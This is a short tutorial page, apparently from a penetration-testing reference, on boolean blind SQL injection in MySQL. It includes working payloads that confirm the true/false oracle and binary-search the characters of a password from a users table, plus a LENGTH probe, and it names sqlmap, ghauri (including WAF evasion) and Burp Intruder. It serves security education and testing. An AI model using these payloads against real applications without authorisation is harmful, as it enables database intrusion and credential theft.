---
title: "Boolean character extraction in MySQL blind injection"
description: "The SUBSTRING and ASCII character oracle for MySQL blind SQL injection, extracting values with a binary search over code points."
keywords:
  - SUBSTRING
  - ASCII
  - binary search
  - blind extraction
  - character oracle
---

# Boolean extraction

The character oracle reads a value one position at a time. `SUBSTRING(value, pos, 1)` returns the character at `pos` and `ASCII(...)` gives its code point, which a comparison turns into a true/false test the response reveals.

Start by confirming the oracle responds differently to true and false:

```sql
' AND 1=1-- 
' AND 1=2-- 
```

With a reliable difference established, extract a value with a binary search over each position. For the first character of the first user's password:

```sql
' AND ASCII(SUBSTRING((SELECT password FROM users LIMIT 1),1,1))>64-- 
' AND ASCII(SUBSTRING((SELECT password FROM users LIMIT 1),1,1))>96-- 
' AND ASCII(SUBSTRING((SELECT password FROM users LIMIT 1),1,1))=97-- 
```

Each `>` test halves the candidate range, so a printable character is pinned in about seven requests. Increment the `SUBSTRING` position to walk the string, and stop when a position returns a code point of zero (no more characters). Determine the length first to know when to stop:

```sql
' AND LENGTH((SELECT password FROM users LIMIT 1))=32-- 
```

Because this generates many near-identical requests, it is almost always automated (for example with Burp Intruder or sqlmap), but understanding the single-request oracle is what lets you adapt it when a tool stalls.

## Tools

- **sqlmap**: automated boolean-based blind extraction with binary search.
- **ghauri**: fast alternative for boolean inference with WAF evasion.
- **Burp Intruder**: automate the character oracle manually over each position.

## References

- MySQL Reference Manual: SUBSTRING, ASCII, LENGTH
- PortSwigger Web Security Academy: Blind SQL injection
